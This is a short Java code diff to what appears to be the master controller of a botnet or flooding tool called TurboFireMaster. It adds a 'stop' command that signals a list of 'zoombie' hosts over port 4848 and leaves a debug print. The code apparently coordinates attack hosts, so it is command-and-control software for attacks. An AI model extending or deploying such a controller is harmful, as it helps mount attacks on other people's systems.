@@ -20,6 +20,7 @@ import java.util.concurrent.TimeUnit;
 import view.GUI;
 import utilies.AttackPattern;
 import tasks.ServerThread;
+import tasks.StopCommandMasterThread;
 import tasks.ClientThread;
 import tasks.ResponseServer;
 import java.net.ServerSocket;
@@ -113,7 +114,12 @@ public class TurboFireMaster {
             this.gui.welcome("master", this.serverPort);
             String[] command = this.gui.getCommand();
             this.gui.clean();
-        if(command[0].equalsIgnoreCase("monitoring")) {
+            
+            if(command[0].equalsIgnoreCase("stop")) {
+                System.out.println("teste");
+                Thread t = new Thread(new StopCommandMasterThread(this.zoombieHosts, 4848));
+                t.start();
+            } else if(command[0].equalsIgnoreCase("monitoring")) {
                 while(true) {
                     try {
                         TimeUnit.SECONDS.sleep(1);
